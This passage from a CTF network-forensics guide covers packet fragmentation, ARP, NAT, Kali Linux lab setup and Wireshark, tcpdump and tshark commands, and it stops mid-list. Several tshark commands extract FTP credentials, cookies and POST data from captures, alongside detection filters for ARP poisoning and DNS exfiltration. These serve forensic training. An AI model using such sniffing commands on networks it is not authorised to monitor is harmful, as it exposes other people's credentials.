- PPPoE: 1492 bytes
- VPN tunnels: Variable (typically 1400-1450)

**Fragmentation Fields:**

- **Identification**: Same for all fragments of original packet
- **More Fragments (MF) flag**: Set for all except last fragment
- **Fragment Offset**: Position of fragment (in 8-byte blocks)

**Analyzing Fragmented Traffic:**

```bash
# Capture fragmented packets
tcpdump -i eth0 'ip[6:2] & 0x1fff != 0'

# Wireshark filters
ip.flags.mf == 1                    # More fragments set
ip.frag_offset > 0                  # Not first fragment
ip.flags.df == 0 && ip.frag_offset == 0  # Fragmentable

# Reassembled packets
ip.reassembled.length

# Fragment reassembly issues
ip.reassembled.error
```

**Fragmentation Attack Detection:**

**Teardrop Attack**: Overlapping fragment offsets **Tiny Fragments**: Fragment with minimal data to evade firewalls **Fragment Flooding**: Overwhelming reassembly buffers

```bash
# Detecting tiny fragments
tshark -r capture.pcap -Y "ip.frag_offset == 0 && ip.len < 68"

# Fragment identification analysis
tshark -r capture.pcap -Y "ip.fragment" -T fields -e ip.id -e ip.frag_offset
```

### Maximum Segment Size (MSS)

**TCP MSS Negotiation:**

MSS announced during TCP handshake (SYN packets) indicates maximum data in single TCP segment.

```
MSS = MTU - IP Header (20 bytes) - TCP Header (20 bytes)
For Ethernet (MTU 1500): MSS = 1460 bytes
```

**Analyzing MSS:**

```bash
# Wireshark filter
tcp.options.mss_val

# Display MSS values
tshark -r capture.pcap -Y "tcp.flags.syn == 1" -T fields -e ip.src -e tcp.options.mss_val

# Identify MSS clamping (VPN/tunneling indicators)
# Look for MSS values < 1460 on Ethernet
```

**CTF Relevance:**

- MSS values reveal network topology
- Non-standard MSS suggests tunneling/VPN
- MSS mismatches can cause performance issues
- Can fingerprint OS/network configuration

### Traffic Timing Analysis

**Round-Trip Time (RTT):**

Time between sending packet and receiving acknowledgment.

```bash
# Wireshark: Statistics > TCP Stream Graphs > Round Trip Time

# Extract RTT with tshark
tshark -r capture.pcap -q -z "tcp,rtt,tcp.port==80"

# Manual RTT calculation
# Find SYN and SYN-ACK packets, calculate time delta
tshark -r capture.pcap -Y "tcp.flags.syn == 1" -T fields -e frame.time_relative
```

**Inter-Packet Timing:**

```bash
# Display time deltas in Wireshark
View > Time Display Format > Seconds Since Previous Displayed Packet

# tshark time delta calculation
tshark -r capture.pcap -T fields -e frame.time_relative -e frame.time_delta

# Identify timing patterns (possible covert timing channels)
tshark -r capture.pcap -Y "frame.time_delta > 0.1" -T fields -e frame.number -e frame.time_delta
```

**Jitter Analysis:**

Variation in packet delay, important for real-time protocols.

```bash
# RTP stream analysis in Wireshark
Telephony > RTP > Stream Analysis

# Manual jitter calculation using tshark
tshark -r capture.pcap -Y "udp" -T fields -e frame.time_delta > deltas.txt
# Then calculate standard deviation
```

### Network Address Translation (NAT) Flow

**NAT Operation:**

```
Internal: 192.168.1.100:45678 → External: 8.8.8.8:53
    ↓ (NAT device translates)
External: 203.0.113.1:12345 → External: 8.8.8.8:53
```

**Identifying NAT in Traffic:**

```bash
# Multiple internal IPs appearing as single external IP
# Look for sequential source ports from same external IP

# TTL changes (NAT device decrements TTL)
# Compare TTL values before and after NAT

# Wireshark: Look for IP ID patterns
ip.id
# Sequential IDs from different internal hosts suggest NAT
```

**NAT Traversal Techniques:**

- STUN (Session Traversal Utilities for NAT)
- TURN (Traversal Using Relays around NAT)
- ICE (Interactive Connectivity Establishment)
- UPnP IGD (Internet Gateway Device)

### Broadcast and Multicast Traffic

**Broadcast Domains:**

**Layer 2 Broadcast**: ff:ff:ff:ff:ff:ff (all devices on segment)

**Layer 3 Broadcast**: 255.255.255.255 or subnet broadcast (e.g., 192.168.1.255)

**Common Broadcast Protocols:**

- ARP requests
- DHCP discovery
- NetBIOS name service
- SSDP (UPnP discovery)

**Analyzing Broadcast Traffic:**

```bash
# Capture broadcasts
tcpdump -i eth0 broadcast

# Wireshark filter
eth.dst == ff:ff:ff:ff:ff:ff
ip.dst == 255.255.255.255

# Count broadcast packets
tshark -r capture.pcap -Y "eth.dst == ff:ff:ff:ff:ff:ff" | wc -l
```

**Multicast Traffic:**

**Multicast MAC**: 01:00:5e:xx:xx:xx

**Multicast IP Ranges**: 224.0.0.0 - 239.255.255.255

**Common Multicast Addresses:**

- 224.0.0.1: All hosts on subnet
- 224.0.0.2: All routers on subnet
- 224.0.0.5: OSPF routers
- 224.0.0.251: mDNS
- 239.255.255.250: SSDP

**Multicast Analysis:**

```bash
# Capture multicast
tcpdump -i eth0 'multicast'

# Wireshark filters
ip.dst >= 224.0.0.0 && ip.dst <= 239.255.255.255
eth.dst[0] & 1                  # Multicast bit set

# IGMP membership reports
igmp.type == 0x16
```

### ARP and Address Resolution

**ARP Request/Reply Flow:**

```
Host A: Who has 192.168.1.1? Tell 192.168.1.100
    ↓ (Broadcast)
Router: 192.168.1.1 is at aa:bb:cc:dd:ee:ff
    ↓ (Unicast reply)
Host A: Updates ARP cache
```

**ARP Packet Structure:**

- Hardware Type (Ethernet = 1)
- Protocol Type (IPv4 = 0x0800)
- Hardware Address Length (6 for MAC)
- Protocol Address Length (4 for IPv4)
- Operation (1=Request, 2=Reply)
- Sender MAC/IP
- Target MAC/IP

**Analyzing ARP Traffic:**

```bash
# Capture ARP
tcpdump -i eth0 arp

# Wireshark filters
arp.opcode == 1              # Requests
arp.opcode == 2              # Replies
arp.duplicate-address-detected  # Duplicate IP

# Display ARP mappings
tshark -r capture.pcap -Y "arp" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac
```

**ARP Poisoning Detection:**

```bash
# Multiple MAC addresses for same IP
arp.duplicate-address-frame

# Unsolicited ARP replies
arp.opcode == 2 && !arp.isgratuitous

# Gratuitous ARP (same src/dst IP)
arp.isgratuitous == 1
```

**CTF Application:**

- ARP cache poisoning attacks
- Man-in-the-middle detection
- Network mapping from ARP traffic
- Gateway/router identification

### Quality of Service (QoS) Basics

**DSCP (Differentiated Services Code Point):**

6-bit field in IP header ToS/DSCP byte used for traffic prioritization.

**Common DSCP Values:**

- CS0 (0): Best effort
- CS1 (8): Low priority
- AF classes (10-46): Assured forwarding
- EF (46): Expedited forwarding (VoIP)
- CS6 (48): Network control
- CS7 (56): Reserved

**Analyzing QoS Markings:**

```bash
# Wireshark filter
ip.dsfield.dscp

# Display QoS markings
tshark -r capture.pcap -Y "ip" -T fields -e ip.src -e ip.dsfield.dscp

# Identify priority traffic
ip.dsfield.dscp == 46        # EF (VoIP)
ip.dsfield.dscp >= 32         # High priority
```

**802.1p Priority (Layer 2 QoS):**

3-bit field in 802.1Q VLAN tag:

- 0: Best effort
- 1: Background
- 2: Spare
- 3: Excellent effort
- 4: Controlled load
- 5: Video
- 6: Voice
- 7: Network control

```bash
# Wireshark filter for VLAN priority
vlan.priority
```

### Connection Teardown

**Normal TCP Termination (Four-way handshake):**

```
Client → Server: FIN (SEQ=x)
Server → Client: ACK (ACK=x+1)
Server → Client: FIN (SEQ=y)
Client → Server: ACK (ACK=y+1)
```

**Abrupt Termination (RST):**

- Sent when connection cannot be established
- Sent when receiving unexpected packets
- Sent to immediately terminate connection
- No acknowledgment required

**Analyzing Connection Termination:**

```bash
# Normal FIN termination
tcp.flags.fin == 1

# RST termination
tcp.flags.reset == 1

# Half-closed connections (FIN sent but no response)
tcp.flags.fin == 1 && !tcp.analysis.retransmission

# TIME_WAIT state indicators
tcp.flags == 0x010           # Final ACK
```

**CTF Application:**

- Premature RST indicates filtered ports/services
- Connection timeouts suggest network issues
- Incomplete terminations may indicate crashes
- RST patterns can fingerprint firewalls/IPS

---

## Related Important Subtopics

For comprehensive CTF network traffic analysis, the following related topics build directly on these fundamentals:

**Protocol-Specific Deep Dives**: HTTP/HTTPS analysis, DNS tunneling detection, SMB/CIFS exploitation indicators

**Traffic Capture Optimization**: BPF filter syntax mastery, selective packet capture strategies, capture performance tuning

**Wireshark Advanced Features**: Custom protocol dissectors, Lua scripting, advanced statistics and graphing

**Covert Channel Detection**: Timing channels, protocol field manipulation, steganography in network traffic

**Network Reconnaissance Patterns**: Scan detection methodologies, fingerprinting techniques, topology discovery from passive analysis

---

# Kali Linux Environment Setup

## Kali Linux Installation & Configuration

### Installation Methods

**Bare Metal Installation**

- Download official Kali Linux ISO from offensive-security.com
- Verify SHA256 checksum: `sha256sum kali-linux-*.iso`
- Create bootable USB: `dd if=kali-linux-*.iso of=/dev/sdX bs=4M status=progress`
- Boot system with UEFI or Legacy BIOS configuration
- Partition recommendations:
    - `/boot`: 500MB (ext4)
    - `/`: 20GB minimum (ext4)
    - `/home`: Remaining space (ext4)
    - `swap`: 2x RAM for hibernation support

**Virtual Machine Deployment**

- VMware Workstation/Player configuration:
    - Allocate 4GB+ RAM (8GB recommended for network analysis)
    - 2+ CPU cores
    - 80GB dynamic disk
    - Network adapter: NAT + Host-only for isolated testing
- VirtualBox setup:
    - Enable VT-x/AMD-V in BIOS
    - Install Guest Additions: `apt install virtualbox-guest-x86`
    - Configure shared folders for pcap transfer

**Initial System Configuration**

```bash
# Update package repositories
apt update && apt upgrade -y

# Set timezone
timedatectl set-timezone YOUR_TIMEZONE

# Configure keyboard layout
dpkg-reconfigure keyboard-configuration

# Enable non-root user (security best practice)
useradd -m -s /bin/bash ctfuser
usermod -aG sudo ctfuser
passwd ctfuser
```

### System Hardening for CTF Environment

```bash
# Disable unnecessary services
systemctl disable bluetooth.service
systemctl disable cups.service

# Configure firewall baseline
ufw enable
ufw default deny incoming
ufw default allow outgoing

# Set up logging
apt install rsyslog
systemctl enable rsyslog
```

## Essential Network Tools Installation

### Core Traffic Analysis Tools

```bash
# Packet capture and analysis
apt install wireshark tshark tcpdump -y

# Network scanning and enumeration
apt install nmap masscan unicornscan -y

# Protocol analyzers
apt install tcpflow ngrep dsniff -y

# Traffic manipulation
apt install hping3 scapy python3-scapy -y

# SSL/TLS analysis
apt install ssldump sslsplit -y

# DNS analysis
apt install dnsutils bind9-dnsutils -y

# HTTP/HTTPS traffic tools
apt install burpsuite zaproxy mitmproxy -y

# Packet crafting
apt install netcat-traditional socat -y

# Network monitoring
apt install iftop nethogs iptraf-ng bmon -y

# Protocol dissectors
apt install python3-dpkt python3-pyshark -y
```

### Specialized CTF Tools

```bash
# Network forensics
apt install networkminer chaosreader pcapfix -y

# Traffic replay
apt install tcpreplay tcprewrite -y

# Statistical analysis
apt install capinfos editcap mergecap -y

# Wireless (if needed)
apt install aircrack-ng kismet -y

# Bluetooth analysis
apt install bluez bluez-tools -y
```

### Python Libraries for Traffic Analysis

```bash
# Install pip if not present
apt install python3-pip -y

# Essential Python packages
pip3 install scapy dpkt pyshark kamene
pip3 install pycryptodome requests
pip3 install impacket netfilterqueue
pip3 install pandas matplotlib
```

### Verification Commands

```bash
# Verify installations
wireshark --version
tshark --version
tcpdump --version
nmap --version
python3 -c "import scapy; print(scapy.__version__)"
```

## Interface Configuration & Management

### Network Interface Enumeration

```bash
# List all interfaces
ip link show
ip addr show

# Legacy tools (still useful)
ifconfig -a
iwconfig  # Wireless interfaces

# Detailed interface information
ethtool eth0
```

### Interface Configuration

**Static IP Configuration**

```bash
# Temporary configuration
ip addr add 192.168.1.100/24 dev eth0
ip link set eth0 up
ip route add default via 192.168.1.1

# Persistent configuration (Netplan for modern Kali)
# Edit /etc/netplan/01-netcfg.yaml
network:
  version: 2
  ethernets:
    eth0:
      addresses: [192.168.1.100/24]
      gateway4: 192.168.1.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]

# Apply configuration
netplan apply
```

**DHCP Configuration**

```bash
# Temporary DHCP
dhclient eth0

# Persistent via Netplan
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: yes
```

### Promiscuous Mode for Packet Capture

```bash
# Enable promiscuous mode
ip link set eth0 promisc on

# Verify
ip link show eth0 | grep PROMISC

# Disable when done
ip link set eth0 promisc off
```

### Virtual Interface Creation

**TAP/TUN Interfaces**

```bash
# Create TAP interface
ip tuntap add dev tap0 mode tap
ip addr add 10.0.0.1/24 dev tap0
ip link set tap0 up

# Create TUN interface
ip tuntap add dev tun0 mode tun
ip addr add 10.0.1.1/24 dev tun0
ip link set tun0 up

# Delete interface
ip link delete tap0
```

**VLAN Interfaces**

```bash
# Load 8021q module
modprobe 8021q

# Create VLAN interface
ip link add link eth0 name eth0.10 type vlan id 10
ip addr add 192.168.10.1/24 dev eth0.10
ip link set eth0.10 up
```

**Bridge Interfaces**

```bash
# Create bridge for traffic analysis
ip link add name br0 type bridge
ip link set eth0 master br0
ip link set tap0 master br0
ip link set br0 up
```

### Monitor Mode (Wireless)

```bash
# Check wireless capabilities
iw list

# Enable monitor mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Set specific channel
iw dev wlan0 set channel 6

# Disable monitor mode
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
```

### Interface Packet Buffers

```bash
# Increase receive buffer size for high-traffic capture
ethtool -G eth0 rx 4096

# Check current buffer settings
ethtool -g eth0

# Disable hardware offloading for accurate capture
ethtool -K eth0 gro off
ethtool -K eth0 lro off
ethtool -K eth0 tso off
ethtool -K eth0 gso off
```

## Virtual Lab Setup

### Network Topology Planning

**Isolated Network Architecture**

```
┌─────────────────────────────────────────┐
│          Host Machine                    │
│  ┌───────────────────────────────────┐  │
│  │  VMnet1 (Host-Only): 192.168.56.0 │  │
│  └───────────────────────────────────┘  │
│         │                │               │
│    ┌────┴────┐      ┌───┴────┐         │
│    │ Kali VM │      │ Target │         │
│    │ .56.101 │      │  .56.102│         │
│    └─────────┘      └────────┘         │
└─────────────────────────────────────────┘
```

### VMware Network Configuration

```bash
# Host-only network setup
# VMware: Edit > Virtual Network Editor
# Add network: VMnet1 (Host-only)
# Subnet: 192.168.56.0/24
# Disable DHCP for manual control

# Configure VM network adapters
# Adapter 1: NAT (Internet access)
# Adapter 2: Host-only (Isolated lab)
```

### VirtualBox Network Setup

```bash
# Create host-only network
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Disable DHCP
VBoxManage dhcpserver remove --netname HostInterfaceNetworking-vboxnet0

# Attach to VM
VBoxManage modifyvm "KaliVM" --nic2 hostonly --hostonlyadapter2 vboxnet0
```

### Docker-Based Lab Environment

```bash
# Install Docker
apt install docker.io docker-compose -y
systemctl enable docker
systemctl start docker

# Create vulnerable containers for practice
docker pull vulnerable/web-dvwa
docker pull vulnerables/web-owasp-nodegoat
docker pull bkimminich/juice-shop

# Create custom network
docker network create --subnet=172.18.0.0/16 ctflab

# Run containers
docker run -d --network ctflab --ip 172.18.0.10 -p 8080:80 vulnerable/web-dvwa
```

### Network Simulation with GNS3

```bash
# Install GNS3
apt install gns3-gui gns3-server -y

# Add user to required groups
usermod -aG ubridge,libvirt,kvm,wireshark,docker ctfuser

# Import Kali VM as appliance
# Use QEMU for VM integration
```

### Traffic Generation Scripts

**HTTP Traffic Generator**

```python
#!/usr/bin/env python3
import requests
import time

targets = ['http://172.18.0.10/login', 'http://172.18.0.10/admin']
for i in range(100):
    for target in targets:
        try:
            requests.get(target)
        except:
            pass
    time.sleep(1)
```

**TCP Traffic Generator**

```bash
#!/bin/bash
for port in {80,443,8080,22,21,3306}; do
    nc -zv 172.18.0.10 $port 2>&1 &
done
```

### Snapshot Management

```bash
# VMware CLI snapshots
vmrun snapshot "/path/to/vm.vmx" "clean_state"
vmrun revertToSnapshot "/path/to/vm.vmx" "clean_state"

# VirtualBox snapshots
VBoxManage snapshot "KaliVM" take "clean_state"
VBoxManage snapshot "KaliVM" restore "clean_state"
```

## Tool Version Management

### Version Checking Strategy

```bash
# Create version inventory script
cat > ~/check_versions.sh << 'EOF'
#!/bin/bash
echo "=== CTF Tool Versions ==="
echo "Wireshark: $(wireshark --version | head -1)"
echo "TShark: $(tshark --version | head -1)"
echo "Tcpdump: $(tcpdump --version 2>&1 | head -1)"
echo "Nmap: $(nmap --version | head -1)"
echo "Scapy: $(python3 -c 'import scapy; print(scapy.__version__)')"
echo "Python: $(python3 --version)"
EOF

chmod +x ~/check_versions.sh
./check_versions.sh
```

### Package Management

**APT-Based Updates**

```bash
# Update specific tool
apt install --only-upgrade wireshark

# Hold package version
apt-mark hold wireshark

# Unhold for updates
apt-mark unhold wireshark

# List held packages
apt-mark showhold
```

**Manual Tool Installation**

```bash
# Example: Installing latest Wireshark from source
apt install build-essential cmake libglib2.0-dev libpcap-dev libgcrypt20-dev flex bison -y

cd /opt
wget https://www.wireshark.org/download/src/wireshark-latest.tar.xz
tar -xvf wireshark-latest.tar.xz
cd wireshark-*/
cmake .
make
make install
ldconfig

# Verify installation
wireshark --version
```

### Version-Specific Tool Installation

**Installing Multiple Nmap Versions**

```bash
# Install from source for specific version
cd /opt
wget https://nmap.org/dist/nmap-7.94.tar.bz2
tar -xjf nmap-7.94.tar.bz2
cd nmap-7.94
./configure --prefix=/opt/nmap-7.94
make
make install

# Create symlink or use full path
/opt/nmap-7.94/bin/nmap --version
```

### Python Virtual Environments

```bash
# Create isolated environment for CTF tools
apt install python3-venv -y

# Create environment
python3 -m venv ~/ctf-venv

# Activate
source ~/ctf-venv/bin/activate

# Install specific versions
pip install scapy==2.5.0
pip install dpkt==1.9.8

# Deactivate
deactivate

# Requirements file for reproducibility
cat > requirements.txt << EOF
scapy==2.5.0
dpkt==1.9.8
pyshark==0.6
pycryptodome==3.19.0
impacket==0.11.0
EOF

pip install -r requirements.txt
```

### Tool Compatibility Testing

```bash
# Test Wireshark dissectors
tshark -G protocols | grep -i http
tshark -G fields | grep -i "http.request"

# Test Scapy layers
python3 << EOF
from scapy.all import *
ls()  # List available protocols
ls(TCP)  # Show TCP fields
EOF

# Test tcpdump filters
tcpdump -d "tcp port 80"  # Show compiled filter
```

### Update Automation Script

```bash
#!/bin/bash
# Weekly CTF environment update script

LOG="/var/log/ctf_update.log"
echo "=== Update started: $(date) ===" >> $LOG

# Update system packages
apt update >> $LOG 2>&1
apt upgrade -y >> $LOG 2>&1

# Update Python packages in venv
source ~/ctf-venv/bin/activate
pip list --outdated >> $LOG
pip install --upgrade scapy dpkt pyshark >> $LOG 2>&1
deactivate

# Update exploit-db
searchsploit -u >> $LOG 2>&1

# Clean package cache
apt clean >> $LOG 2>&1
apt autoremove -y >> $LOG 2>&1

echo "=== Update completed: $(date) ===" >> $LOG
```

### Rollback Procedures

```bash
# APT package rollback
apt install package_name=version

# Example: Downgrade Wireshark
apt install wireshark=3.6.7-1

# List available versions
apt-cache policy wireshark

# Reinstall package
apt install --reinstall wireshark
```

---

**Important Subtopics:**

- Network interface card (NIC) driver configuration for packet injection
- Kernel parameter tuning for high-volume traffic capture
- Storage optimization for large pcap files
- Time synchronization (NTP) for accurate timestamp analysis
- SELinux/AppArmor configuration for security tool exceptions

---

# Traffic Capture Tools

## Wireshark Basics

Wireshark is a graphical network protocol analyzer that captures and displays packet data in real-time or from saved capture files.

**Installation and Launch**

```bash
sudo apt update && sudo apt install wireshark
sudo wireshark
```

**Capture Interface Configuration**

- Select interface: `Capture > Options` or `Ctrl+K`
- Common interfaces: `eth0` (wired), `wlan0` (wireless), `lo` (loopback), `any` (all interfaces)
- Promiscuous mode: Enabled by default, captures all traffic visible to NIC
- Monitor mode (wireless): Requires interface configuration outside Wireshark

**Display Filters** (applied to captured data)

```
ip.addr == 192.168.1.100           # Traffic to/from specific IP
ip.src == 10.0.0.5                 # Source IP filtering
ip.dst == 172.16.0.1               # Destination IP filtering
tcp.port == 80                     # HTTP traffic
tcp.port == 443                    # HTTPS traffic
http                               # All HTTP traffic
dns                                # All DNS queries/responses
ftp                                # FTP traffic
tcp.flags.syn == 1                 # SYN packets (connection attempts)
tcp.stream eq 5                    # Follow specific TCP stream
frame contains "password"          # Search packet content
http.request.method == "POST"      # HTTP POST requests
http.response.code == 200          # Successful HTTP responses
!(arp or dns or icmp)              # Exclude protocols
tcp.analysis.retransmission        # Retransmitted packets
tcp.analysis.flags                 # TCP issues (RST, lost segments)
```

**Capture Filters** (applied during capture, uses BPF syntax)

```
host 192.168.1.100                 # Specific host
net 10.0.0.0/8                     # Network range
port 80                            # Specific port
tcp port 443                       # TCP on specific port
src host 192.168.1.5               # Source host
dst port 22                        # Destination port
not port 53                        # Exclude DNS
portrange 1-1024                   # Port range
```

**Key Features for CTF Analysis**

- **Follow TCP Stream**: Right-click packet > `Follow > TCP Stream` - reconstructs full conversation
- **Follow HTTP Stream**: Extracts complete HTTP transactions
- **Export Objects**: `File > Export Objects > HTTP/SMB/TFTP` - extracts files transferred
- **Protocol Hierarchy**: `Statistics > Protocol Hierarchy` - overview of protocols in capture
- **Conversations**: `Statistics > Conversations` - lists all connections
- **Endpoints**: `Statistics > Endpoints` - all communicating devices
- **IO Graphs**: `Statistics > I/O Graph` - visualize traffic patterns

**File Operations**

```bash
# Save captures
File > Save As > .pcap or .pcapng

# Merge captures
File > Merge

# Export specific packets
File > Export Specified Packets
```

**Useful Columns to Add** (`Right-click column header > Column Preferences`)

- TCP Stream Index
- HTTP Host
- HTTP Request Method
- DNS Query Name

**Coloring Rules**

- `View > Coloring Rules` - customize packet highlighting
- Default: TCP issues (red), HTTP (green), DNS (blue)

## tcpdump Command-Line Capture

tcpdump is a command-line packet analyzer using libpcap, ideal for headless systems and scripting.

**Basic Syntax**

```bash
tcpdump [options] [filter_expression]
```

**Essential Options**

```bash
-i <interface>       # Specify interface (eth0, wlan0, any)
-w <file.pcap>       # Write to file
-r <file.pcap>       # Read from file
-n                   # No DNS resolution (faster)
-nn                  # No DNS or port resolution
-v, -vv, -vvv        # Verbosity levels
-c <count>           # Capture N packets then stop
-s <snaplen>         # Capture N bytes per packet (0 = entire packet)
-A                   # Print packet payload in ASCII
-X                   # Print payload in hex and ASCII
-q                   # Quiet mode (less protocol info)
-t                   # No timestamps
-tttt                # Human-readable timestamps
-e                   # Print link-level headers (MAC addresses)
-K                   # Don't verify TCP checksums
-l                   # Line-buffered output (pipe to other tools)
```

**Common Capture Commands**

```bash
# Basic capture on eth0
sudo tcpdump -i eth0

# Capture to file with no resolution
sudo tcpdump -i eth0 -nn -w capture.pcap

# Capture specific packet count
sudo tcpdump -i eth0 -c 1000 -w output.pcap

# Capture with full packet length
sudo tcpdump -i eth0 -s 0 -w full.pcap

# Real-time analysis with verbosity
sudo tcpdump -i eth0 -vv -A

# Capture with timestamps and hex output
sudo tcpdump -i eth0 -tttt -X -nn
```

**Filter Expressions** (BPF - Berkeley Packet Filter)

```bash
# Host filtering
sudo tcpdump host 192.168.1.100
sudo tcpdump src host 10.0.0.5
sudo tcpdump dst host 172.16.0.1

# Network filtering
sudo tcpdump net 192.168.0.0/16
sudo tcpdump net 10.0.0.0 mask 255.255.255.0

# Port filtering
sudo tcpdump port 80
sudo tcpdump src port 22
sudo tcpdump dst port 443
sudo tcpdump portrange 20-21

# Protocol filtering
sudo tcpdump tcp
sudo tcpdump udp
sudo tcpdump icmp
sudo tcpdump arp

# TCP flags
sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'     # SYN packets
sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'     # RST packets
sudo tcpdump 'tcp[tcpflags] == tcp-syn'         # Only SYN (no ACK)
sudo tcpdump 'tcp[13] & 2 != 0'                 # SYN flag (numeric)

# Combined filters with logical operators
sudo tcpdump 'host 192.168.1.100 and port 80'
sudo tcpdump 'src net 10.0.0.0/8 and dst port 443'
sudo tcpdump 'tcp port 80 or tcp port 443'
sudo tcpdump 'not port 22 and not port 53'
sudo tcpdump 'host 192.168.1.5 and (port 80 or port 443)'

# Advanced filtering
sudo tcpdump 'tcp[13] = 0x02'                   # SYN only
sudo tcpdump 'tcp[13] = 0x12'                   # SYN-ACK
sudo tcpdump 'ip[2:2] > 1000'                   # IP packet length > 1000
sudo tcpdump 'ether dst ff:ff:ff:ff:ff:ff'     # Broadcast traffic
```

**CTF-Specific Examples**

```bash
# Capture HTTP traffic with full content
sudo tcpdump -i eth0 -A -s 0 'tcp port 80'

# Capture suspicious scans
sudo tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'

# Capture DNS queries only
sudo tcpdump -i eth0 -nn udp port 53

# Capture FTP traffic
sudo tcpdump -i eth0 -nn 'port 21 or port 20'

# Capture and exclude your own IP
sudo tcpdump -i eth0 -nn 'not host 192.168.1.50'

# Capture with rotating files (100MB each)
sudo tcpdump -i eth0 -W 5 -C 100 -w trace.pcap

# Capture specific protocol payloads
sudo tcpdump -i eth0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'  # HTTP GET
```

**Reading and Processing Captures**

```bash
# Read and display
tcpdump -r capture.pcap -nn

# Read with specific filter
tcpdump -r capture.pcap -nn 'host 192.168.1.100'

# Read and extract specific data
tcpdump -r capture.pcap -A | grep -i "password"

# Count packets per host
tcpdump -r capture.pcap -nn | awk '{print $3}' | sort | uniq -c | sort -rn
```

## tshark (Wireshark CLI)

tshark is the command-line version of Wireshark, combining tcpdump's efficiency with Wireshark's protocol dissection.

**Basic Syntax**

```bash
tshark [capture_options] [output_options] [filter_options]
```

**Capture Options**

```bash
-i <interface>       # Interface to capture from
-f <filter>          # Capture filter (BPF syntax)
-c <count>           # Packet count
-a duration:<sec>    # Auto-stop after N seconds
-a filesize:<kb>     # Auto-stop after file size
-b filesize:<kb>     # Ring buffer filesize
-b files:<n>         # Ring buffer file count
-w <file>            # Write to file
-r <file>            # Read from file
-s <snaplen>         # Snapshot length
```

**Display and Output Options**

```bash
-Y <filter>          # Display filter (Wireshark syntax)
-T fields            # Output as fields
-T json              # JSON output
-T jsonraw           # JSON with raw hex
-T ek                # Elasticsearch JSON
-T pdml              # PDML (XML)
-T ps                # PostScript
-T text              # Default text
-e <field>           # Specify field to display (use with -T fields)
-E separator=,       # Field separator (CSV)
-E quote=d           # Quote character
-E header=y          # Print header
-V                   # Verbose packet details
-O <protocol>        # Show only specific protocol details
-q                   # Quiet mode
-z <statistics>      # Statistics output
```

**Basic Capture Commands**

```bash
# List interfaces
tshark -D

# Capture on interface
sudo tshark -i eth0

# Capture to file
sudo tshark -i eth0 -w capture.pcap

# Capture with display filter
sudo tshark -i eth0 -Y 'http.request.method == "POST"'

# Capture with count limit
sudo tshark -i eth0 -c 100
```

**Reading and Filtering Captures**

```bash
# Read file with display filter
tshark -r capture.pcap -Y 'ip.addr == 192.168.1.100'

# Read with protocol-specific view
tshark -r capture.pcap -Y http -V

# Read specific protocol details only
tshark -r capture.pcap -O http

# Multiple protocols
tshark -r capture.pcap -O http,dns
```

**Field Extraction** (extremely useful for CTF)

```bash
# Extract specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# Extract HTTP fields
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri

# Extract with headers (CSV format)
tshark -r capture.pcap -T fields -E header=y -E separator=, -e ip.src -e ip.dst

# Extract DNS queries
tshark -r capture.pcap -Y dns.flags.response==0 -T fields -e dns.qry.name

# Extract credentials from FTP
tshark -r capture.pcap -Y 'ftp.request.command=="USER" or ftp.request.command=="PASS"' -T fields -e ftp.request.arg

# Extract HTTP POST data
tshark -r capture.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data

# Extract unique IP addresses
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | sort -u
```

**Advanced Display Filters**

```bash
# HTTP requests with specific user-agent
tshark -r capture.pcap -Y 'http.user_agent contains "curl"'

# TCP streams with data
tshark -r capture.pcap -Y 'tcp.len > 0'

# Suspicious traffic patterns
tshark -r capture.pcap -Y 'tcp.flags.syn==1 and tcp.flags.ack==0'

# Failed connections
tshark -r capture.pcap -Y 'tcp.flags.reset==1'

# Large packets
tshark -r capture.pcap -Y 'frame.len > 1400'

# Specific TCP stream
tshark -r capture.pcap -Y 'tcp.stream==5'

# ICMP tunneling detection
tshark -r capture.pcap -Y 'icmp and data.len > 64'
```

**Statistics and Analysis**

```bash
# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Conversations
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp

# Endpoints
tshark -r capture.pcap -q -z endpoints,ip

# HTTP statistics
tshark -r capture.pcap -q -z http,tree

# DNS statistics
tshark -r capture.pcap -q -z dns,tree

# Expert info (errors/warnings)
tshark -r capture.pcap -q -z expert

# IO statistics
tshark -r capture.pcap -q -z io,stat,1  # 1-second intervals
```

**Following TCP Streams**

```bash
# Follow specific stream to stdout
tshark -r capture.pcap -q -z follow,tcp,ascii,5  # Stream 5

# Follow stream to file
tshark -r capture.pcap -q -z follow,tcp,raw,5 > stream5.raw

# Extract all streams (requires script)
for i in $(tshark -r capture.pcap -T fields -e tcp.stream | sort -n | uniq); do
    tshark -r capture.pcap -q -z follow,tcp,ascii,$i > stream_$i.txt
done
```

**Exporting Objects**

```bash
# Export HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# Export SMB objects
tshark -r capture.pcap --export-objects smb,./smb_objects/

# Export TFTP objects
tshark -r capture.pcap --export-objects tftp,./tftp_objects/
```

**CTF-Specific Examples**

```bash
# Find potential flags in HTTP traffic
tshark -r capture.pcap -Y http -T fields -e http.file_data | grep -i "flag\|ctf"

# Extract all HTTP cookies
tshark -r capture.pcap -Y http.cookie -T fields -e http.cookie

# Find base64 encoded data in HTTP
tshark -r capture.pcap -Y http -T fields -e http.file_data | grep -E '^[A-Za-z0-9+/=]{20,}$'

# Detect exfiltration via DNS
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | awk -F. '{if(length($1)>20)print}'

# Extract TCP payloads
tshark -r capture.pcap -Y 'tcp.len > 0' -T fields -e tcp.payload

# Find suspicious user-agents
